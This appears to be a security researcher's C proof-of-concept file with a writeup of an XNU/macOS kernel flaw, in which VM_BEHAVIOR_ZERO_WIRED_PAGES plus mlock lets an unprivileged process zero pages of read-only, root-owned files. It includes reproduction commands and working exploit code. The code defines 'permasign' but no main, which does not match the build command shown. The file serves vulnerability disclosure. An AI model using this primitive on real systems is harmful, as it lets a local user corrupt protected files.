#if 0
XNU VM_BEHAVIOR_ZERO_WIRED_PAGES behavior allows writing to read-only pages

% python3 -c "print('A'*0x8000)" > AAAAs.txt
% chmod a-w AAAAs.txt 
% sudo chown root:wheel AAAAs.txt 

// file is read-only, owned by root and full of A's

% clang -o unwire_mlock_poc unwire_mlock_poc.c
% ./unwire_mlock_poc AAAAs.txt

// file is still read-only, owned by root, but now has some zeros :)

writeup:

VMEs define the privileges which a particular map has over particular regions of a vm_object.
(See the previous XNU vm issues I reported a few years ago plus my offensivecon 2023 presentation
for more details about that.)

The vm_behavior VM_BEHAVIOR_ZERO_WIRED_PAGES can be set by a task on any vm_entry in its map;
there are no permission checks. It causes the entry->zero_wired_pages flag to be set.

In vm_map_delete, if an entry with a non-zero wired_count is being removed from a map it gets passed to
vm_fault_unwire which looks up the page from the underlying object (using VM_PROT_NONE)

				result = vm_fault_page(
					object,
					(VME_OFFSET(entry) +
					(va - entry->vme_start)),
					VM_PROT_NONE, TRUE,
					FALSE, /* page not looked up */
					&prot, &result_page, &top_page,
					(int *)0,
					NULL, map->no_zero_fill,
					&fault_info);

and then, if zero_wired_pages is set in the entry, passes the page to pmap_zero_page:

				if (entry->zero_wired_pages) {
					pmap_zero_page(VM_PAGE_GET_PHYS_PAGE(result_page));
					entry->zero_wired_pages = FALSE;
				}

At no point either when the flag is set or when the page is zero'd are the permissions checked
or the object semantics respected - the underlying page is just zero'd at the pmap layer.

The one challenge is that you do actually need to get the page wired, and the page has to be something
interesting that's worth being able to write to.

The first observation is that it is possible and supported to wire a page only for reading; i.e. such that
reading from that page won't fault, but writing might. That means it's fine to try to wire read-only pages.

The second observation is that you can't wire pages from objects with symmetric copy semantics - this is
enforced in vm_map_wire_nested which implements the actual semantics. Symmetric objects get converted to
delay copy here, so you can't use this issue to invisibly write to symmetric copy-on-write memory.

But there are still delay copy objects which are interesting , the most obvious being the vnode pager
(i.e. files and their UBC pages.)

Directly calling mach_vm_wire requires the host_priv port (you need to be root) but mlock is unprivileged
and wraps a call to mach_vm_wire_kernel.

So putting it all together, you can open a read-only, root-owned file, mmap an interesting page of it, mark
that vm_entry as VM_BEHAVIOR_ZERO_WIRED_PAGES, mlock the page then mach_vm_deallocate the page and the
underlying UBC page backing that region in the file will get zero'd out directly at the pmap layer!

I'm pretty sure you'd be able to do something interesting with this primitive but yeah, currently an exercise for the reader ;)

PoC only tested on MacOS 15.2 (24C101) on MacBook Pro 13-inch 2019 (Intel, the one I use as a kernel debugging target)
#endif

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach/mach.h>

void* map_file_page_ro(char* path) {
  int fd = open(path, O_RDONLY);

  if (fd == -1) {
    printf("open failed\n");
    exit(EXIT_FAILURE);
  }

  void* mapped_at = mmap(0, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);

  if (mapped_at == MAP_FAILED) {
    printf("mmap failed\n");
    exit(EXIT_FAILURE);  
  }

  return mapped_at;
}

int permasign(int argc, char** argv) {
  kern_return_t kr;

  if (argc < 2) {
    printf("need a file path\n");
    return 0;
  }
  
  void* page = map_file_page_ro(argv[1]);

  printf("mapped file at 0x%016llx\n", (uint64_t)page);

  kr = vm_behavior_set(mach_task_self(),
                            (mach_vm_address_t)page,
                            PAGE_SIZE,
                            VM_BEHAVIOR_ZERO_WIRED_PAGES);

  if (kr != KERN_SUCCESS) {
    printf("failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES on the entry\n");
    exit(EXIT_FAILURE);
  }

  printf("set VM_BEHAVIOR_ZERO_WIRED_PAGES\n");
 
  // wire the memory
  // unlike mach_vm_wire, mlock doesn't require root 
  int mlock_err = mlock(page, PAGE_SIZE);
  if (mlock_err != 0) {
    perror("mlock failed\n");
    exit(EXIT_FAILURE);
  }
  printf("mlock success\n");

  kr = vm_deallocate(mach_task_self(),
                          (mach_vm_address_t)page,
                          PAGE_SIZE);
  if (kr != KERN_SUCCESS) {
    printf("vm_deallocate failed: %s\n", mach_error_string(kr));
    exit(EXIT_FAILURE);
  }
  printf("deleted map entries before unwiring\n");
    
  printf("[*] Done! Now respring/reload the file somehow...\n");

  return 0;
}
